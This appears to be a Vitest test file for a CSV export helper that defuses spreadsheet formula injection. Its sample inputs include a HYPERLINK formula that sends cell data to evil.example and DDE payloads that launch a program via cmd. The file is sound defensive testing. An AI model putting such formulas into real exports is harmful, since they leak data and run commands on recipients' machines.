/**
 * The shared CSV helper every frontend export goes through.
 *
 * A cell that starts with = + - @ (or tab / CR) is a formula to Excel, Sheets
 * and LibreOffice. Remarks and invoice numbers are writable by editors and by
 * anyone holding a public edit link, so exports must neutralise them.
 */
import { describe, it, expect } from 'vitest'
import { csvCell, csvRow, neutralizeCsvValue, toCsv } from '../utils/csv'

describe('neutralizeCsvValue', () => {
  it.each([
    ['=HYPERLINK("https://evil.example/?d="&B2,"Open")', `'=HYPERLINK("https://evil.example/?d="&B2,"Open")`],
    ['+cmd|\' /C calc\'!A0', `'+cmd|' /C calc'!A0`],
    ['-2+3+cmd|\' /C calc\'!A0', `'-2+3+cmd|' /C calc'!A0`],
    ['@SUM(A1:A9)', `'@SUM(A1:A9)`],
    ['\t=1+1', `'\t=1+1`],
    ['\r=1+1', `'\r=1+1`],
  ])('prefixes %j with an apostrophe', (input, expected) => {
    expect(neutralizeCsvValue(input)).toBe(expected)
  })

  it('leaves real numbers alone, negative ones included', () => {
    expect(neutralizeCsvValue(-1500)).toBe('-1500')
    expect(neutralizeCsvValue(0)).toBe('0')
    expect(neutralizeCsvValue('-1500')).toBe('-1500')
    expect(neutralizeCsvValue('-12.5')).toBe('-12.5')
    expect(neutralizeCsvValue('+18')).toBe('+18')
    expect(neutralizeCsvValue('1e3')).toBe('1e3')
  })

  it('leaves ordinary text alone', () => {
    expect(neutralizeCsvValue('WM/26-27/168')).toBe('WM/26-27/168')
    expect(neutralizeCsvValue('Paid — thanks')).toBe('Paid — thanks')
    expect(neutralizeCsvValue('a=b')).toBe('a=b')
    expect(neutralizeCsvValue(null)).toBe('')
    expect(neutralizeCsvValue(undefined)).toBe('')
  })
})

describe('csvCell / csvRow / toCsv', () => {
  it('quotes commas, quotes and line breaks — including a bare CR', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('say "hi"')).toBe('"say ""hi"""')
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"')
    expect(csvCell('cr\ronly')).toBe('"cr\ronly"')
    expect(csvCell('plain')).toBe('plain')
  })

  it('neutralises before quoting, so the apostrophe sits inside the quotes', () => {
    expect(csvCell('=HYPERLINK("x","y")')).toBe(`"'=HYPERLINK(""x"",""y"")"`)
  })

  it('joins rows and lines', () => {
    expect(csvRow(['INV-1', -50, '=1+1', null])).toBe(`INV-1,-50,'=1+1,`)
    expect(toCsv([['Invoice', 'Remark'], ['INV-1', '@risk']])).toBe(`Invoice,Remark\nINV-1,'@risk`)
  })
})
